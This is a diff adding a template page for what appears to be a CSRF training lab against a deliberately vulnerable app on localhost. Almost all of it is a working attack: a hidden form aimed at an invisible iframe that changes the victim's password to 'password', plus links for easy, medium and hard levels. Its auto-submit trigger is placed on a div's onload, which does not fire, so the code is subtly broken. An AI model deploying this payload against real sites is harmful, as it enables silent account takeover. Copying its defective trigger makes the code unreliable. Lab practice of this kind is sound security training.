@@ -1,0 +1,18 @@
+{% extends 'base.html' %}
+{% block attack %}
+    <div onload="document.form1.submit()">
+        <form action="http://localhost/vulnerabilities/csrf/" method="GET" name="form1" target="hidden-iframe">
+        <input type="hidden" name="password_new" value="password">
+        <input type="hidden" name="password_conf" value="password">
+        <input type="hidden" value="Change" name="Change">
+        </form>
+        <iframe name="hidden-iframe" style="display: none;" name="hidden-iframe"></iframe>
+    </div>
+{% endblock %}
+{% block attack_list %}
+    <ul>
+        <li><a href="{{ url_for('easy') }}">easy</a></li>
+        <li class="selected"><a href="{{ url_for('medium') }}">medium</a></li>
+        <li><a href="{{ url_for('hard') }}">hard</a></li>
+    </ul>
+{% endblock %}
